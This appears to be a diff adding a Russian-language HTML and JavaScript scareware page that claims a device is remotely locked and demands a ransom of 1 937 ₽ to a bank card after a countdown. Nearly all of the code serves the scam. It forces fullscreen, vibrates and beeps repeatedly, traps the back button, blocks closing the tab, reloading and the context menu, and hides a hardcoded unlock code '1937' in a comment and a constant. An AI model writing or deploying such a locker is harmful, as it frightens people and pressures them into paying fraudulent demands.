@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Система заблокирована</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100%;
+    background: #05000a; color: #0f0;
+    font-family: "Courier New", monospace;
+    overflow: hidden;
+    -webkit-user-select: none; user-select: none;
+    touch-action: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+  #lock, #pay {
+    position: fixed; inset: 0;
+    display: none; flex-direction: column;
+    justify-content: center; align-items: center;
+    text-align: center; padding: 20px;
+    z-index: 100;
+    overflow-y: auto;
+  }
+  #lock { display: flex; }
+  h1 {
+    font-size: 20px; margin: 0 0 8px;
+    letter-spacing: 2px; color: #f00;
+    animation: blink 1s infinite;
+  }
+  p { font-size: 13px; margin: 4px 0; opacity: 0.85; }
+  .warn { color: #f66; font-size: 12px; margin-top: 14px; }
+  #countdown {
+    font-size: 56px; color: #f00; margin: 18px 0;
+    font-weight: bold;
+  }
+  #bar {
+    width: 82%; height: 12px; border: 1px solid #0f0;
+    margin-top: 6px; position: relative;
+  }
+  #barfill {
+    position: absolute; left: 0; top: 0; bottom: 0;
+    width: 0%; background: #0f0;
+    transition: width 0.25s linear;
+  }
+  .box {
+    margin-top: 22px; display: flex; gap: 10px;
+    flex-direction: column; align-items: center;
+    width: 100%; max-width: 340px;
+  }
+  input {
+    width: 100%; padding: 12px;
+    background: #000; color: #0f0;
+    border: 1px solid #0f0; border-radius: 4px;
+    font-size: 18px; text-align: center;
+    letter-spacing: 6px;
+    font-family: "Courier New", monospace;
+    box-sizing: border-box;
+  }
+  input:focus { outline: none; box-shadow: 0 0 12px #0f0; }
+  button {
+    padding: 12px 26px; background: #0f0; color: #000;
+    border: 0; border-radius: 4px; font-size: 15px;
+    font-weight: bold; cursor: pointer;
+    font-family: "Courier New", monospace;
+    width: 100%;
+  }
+  button:active { background: #0a0; }
+  #err {
+    color: #f00; font-size: 13px; height: 18px;
+    margin-top: 6px; letter-spacing: 1px;
+  }
+
+  /* экран оплаты */
+  #pay { background: #0a0000; }
+  #pay h1 { color: #f00; animation: none; }
+  .pay-card {
+    background: #120000; border: 1px solid #f00;
+    border-radius: 8px; padding: 18px;
+    width: 100%; max-width: 340px; margin-top: 14px;
+    text-align: left;
+  }
+  .pay-card .row {
+    display: flex; justify-content: space-between;
+    font-size: 13px; margin: 6px 0; color: #f66;
+  }
+  .pay-card .row b { color: #fff; }
+  .pay-card .sum {
+    font-size: 26px; color: #f00; text-align: center;
+    margin: 12px 0; font-weight: bold;
+  }
+  .pay-card .req {
+    font-size: 12px; color: #aaa; text-align: center;
+    margin-top: 8px; word-break: break-all;
+  }
+  #payStatus {
+    color: #f00; font-size: 13px; height: 18px;
+    margin-top: 10px; text-align: center;
+  }
+
+  .glitch { animation: glitch 0.14s infinite; }
+  @keyframes glitch {
+    0%   { transform: translate(0,0); }
+    25%  { transform: translate(-2px,1px); }
+    50%  { transform: translate(2px,-1px); }
+    75%  { transform: translate(-1px,-2px); }
+    100% { transform: translate(1px,2px); }
+  }
+  @keyframes blink {
+    0%,100% { opacity: 1; }
+    50%     { opacity: 0.35; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ЭКРАН 1: локер -->
+<div id="lock">
+  <h1>СИСТЕМА ЗАБЛОКИРОВАНА</h1>
+  <p>Устройство заблокировано удалённо.</p>
+  <p>Для разблокировки требуется подтверждение.</p>
+
+  <div id="countdown">10</div>
+  <div id="bar"><div id="barfill"></div></div>
+
+  <div class="box">
+    <button id="toPayBtn" style="display:none;">ПЕРЕЙТИ К ОПЛАТЕ</button>
+    <input id="code" type="text" inputmode="numeric" maxlength="8"
+           placeholder="КОД" autocomplete="off">
+    <button id="unlockBtn">РАЗБЛОКИРОВАТЬ</button>
+    <div id="err"></div>
+  </div>
+
+  <div class="warn">Попытки фиксируются. Не выключайте устройство.</div>
+</div>
+
+<!-- ЭКРАН 2: оплата -->
+<div id="pay">
+  <h1>ТРЕБУЕТСЯ ОПЛАТА</h1>
+  <p>Для снятия блокировки внесите платёж.</p>
+
+  <div class="pay-card">
+    <div class="row"><span>Услуга:</span><b>Разблокировка устройства</b></div>
+    <div class="row"><span>Статус:</span><b style="color:#f00;">ОЖИДАНИЕ</b></div>
+    <div class="sum">1 937 ₽</div>
+    <div class="row"><span>Срок:</span><b>24 часа</b></div>
+    <div class="req">Реквизиты: карта 1937 •••• •••• 1937<br>Получатель: СИСТЕМА-СЕРВИС</div>
+  </div>
+
+  <div class="box">
+    <input id="payAmount" type="text" inputmode="numeric" placeholder="СУММА" autocomplete="off">
+    <button id="payBtn">ПОДТВЕРДИТЬ ОПЛАТУ</button>
+    <div id="payStatus"></div>
+  </div>
+
+  <div class="warn">После оплаты введите код разблокировки.</div>
+  <button id="backBtn" style="margin-top:12px; background:#333; color:#f66; max-width:340px;">НАЗАД</button>
+</div>
+
+<script>
+/* ============================================================
+   HTML-локер + экран оплаты
+   ПАРОЛЬ: 1937
+   ============================================================ */
+
+const PASSWORD       = '1937';   // <-- ПАРОЛЬ РАЗБЛОКИРОВКИ
+const PAY_AMOUNT     = '1937';   // ожидаемая сумма на экране оплаты
+const COUNTDOWN_FROM = 10;       // отсчёт до активации
+const VIBRATE_MS     = 400;
+
+const el = {
+  lock:      document.getElementById('lock'),
+  pay:       document.getElementById('pay'),
+  countdown: document.getElementById('countdown'),
+  barfill:   document.getElementById('barfill'),
+  code:      document.getElementById('code'),
+  err:       document.getElementById('err'),
+  unlockBtn: document.getElementById('unlockBtn'),
+  toPayBtn:  document.getElementById('toPayBtn'),
+  payAmount: document.getElementById('payAmount'),
+  payBtn:    document.getElementById('payBtn'),
+  payStatus: document.getElementById('payStatus'),
+  backBtn:   document.getElementById('backBtn'),
+};
+
+let payConfirmed = false;
+
+/* ---------- вспомогательные ---------- */
+
+function vibrate(pattern) {
+  if (navigator.vibrate) navigator.vibrate(pattern);
+}
+
+function beep(freq, dur) {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.type = 'square';
+    osc.frequency.value = freq;
+    gain.gain.value = 0.07;
+    osc.connect(gain); gain.connect(ctx.destination);
+    osc.start();
+    setTimeout(() => { osc.stop(); ctx.close(); }, dur);
+  } catch (e) {}
+}
+
+function fullscreen() {
+  const d = document.documentElement;
+  if (d.requestFullscreen) d.requestFullscreen().catch(() => {});
+  else if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
+}
+
+/* ---------- обратный отсчёт ---------- */
+
+let n = COUNTDOWN_FROM;
+el.countdown.textContent = n;
+
+const timer = setInterval(() => {
+  n--;
+  el.countdown.textContent = Math.max(n, 0);
+  el.barfill.style.width = ((COUNTDOWN_FROM - n) / COUNTDOWN_FROM * 100) + '%';
+  vibrate(40);
+  beep(500 + n * 40, 70);
+
+  if (n <= 0) {
+    clearInterval(timer);
+    el.countdown.textContent = '0';
+    el.lock.classList.add('glitch');
+    el.toPayBtn.style.display = 'block';   // показать кнопку оплаты
+    vibrate([300, 80, 300, 80, 600]);
+    beep(180, 400);
+
+    setInterval(() => {
+      vibrate(VIBRATE_MS);
+      beep(160, 120);
+    }, 1100);
+  }
+}, 1000);
+
+/* ---------- переход к оплате ---------- */
+
+el.toPayBtn.addEventListener('click', () => {
+  el.lock.style.display = 'none';
+  el.pay.style.display = 'flex';
+  el.payAmount.focus();
+  vibrate(60);
+});
+
+/* ---------- подтверждение оплаты ---------- */
+
+el.payBtn.addEventListener('click', () => {
+  const val = (el.payAmount.value || '').replace(/\s/g, '');
+  if (val === PAY_AMOUNT) {
+    payConfirmed = true;
+    el.payStatus.style.color = '#0f0';
+    el.payStatus.textContent = 'ПЛАТЁЖ ПОДТВЕРЖДЁН. ВВЕДИТЕ КОД.';
+    beep(900, 150);
+    vibrate(80);
+    setTimeout(() => {
+      el.pay.style.display = 'none';
+      el.lock.style.display = 'flex';
+      el.code.focus();
+    }, 900);
+  } else {
+    el.payStatus.style.color = '#f00';
+    el.payStatus.textContent = 'НЕВЕРНАЯ СУММА';
+    vibrate([120, 80, 120]);
+    beep(120, 180);
+    el.payAmount.value = '';
+    el.payAmount.focus();
+  }
+});
+
+/* ---------- возврат на локер ---------- */
+
+el.backBtn.addEventListener('click', () => {
+  el.pay.style.display = 'none';
+  el.lock.style.display = 'flex';
+  el.code.focus();
+});
+
+/* ---------- проверка пароля ---------- */
+
+function checkCode() {
+  const val = (el.code.value || '').trim();
+  if (val === PASSWORD) {
+    el.err.style.color = '#0f0';
+    el.err.textContent = 'ДОСТУП РАЗРЕШЁН';
+    beep(900, 150);
+    vibrate(80);
+    setTimeout(() => {
+      el.lock.style.display = 'none';
+      el.pay.style.display = 'none';
+      document.body.style.background = '#000';
+      history.pushState(null, '', location.href);
+    }, 700);
+  } else {
+    el.err.style.color = '#f00';
+    el.err.textContent = 'НЕВЕРНЫЙ КОД';
+    vibrate([120, 80, 120]);
+    beep(120, 180);
+    el.code.value = '';
+    el.code.focus();
+  }
+}
+
+el.unlockBtn.addEventListener('click', checkCode);
+el.code.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') checkCode();
+});
+
+/* ---------- блокировка выхода ---------- */
+
+history.pushState(null, '', location.href);
+window.addEventListener('popstate', () => {
+  history.pushState(null, '', location.href);
+});
+
+window.addEventListener('beforeunload', (e) => {
+  e.preventDefault();
+  e.returnValue = '';
+});
+
+window.addEventListener('contextmenu', (e) => e.preventDefault());
+window.addEventListener('selectstart', (e) => e.preventDefault());
+
+window.addEventListener('keydown', (e) => {
+  if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 't' || e.key === 'n')) {
+    e.preventDefault();
+  }
+  if (e.key === 'F5') e.preventDefault();
+});
+
+/* ---------- запуск ---------- */
+
+function start() {
+  fullscreen();
+  el.code.focus();
+}
+document.body.addEventListener('touchstart', function once() {
+  document.body.removeEventListener('touchstart', once);
+  start();
+}, { once: true });
+if (!('ontouchstart' in window)) start();
+</script>
+</body>
+</html>
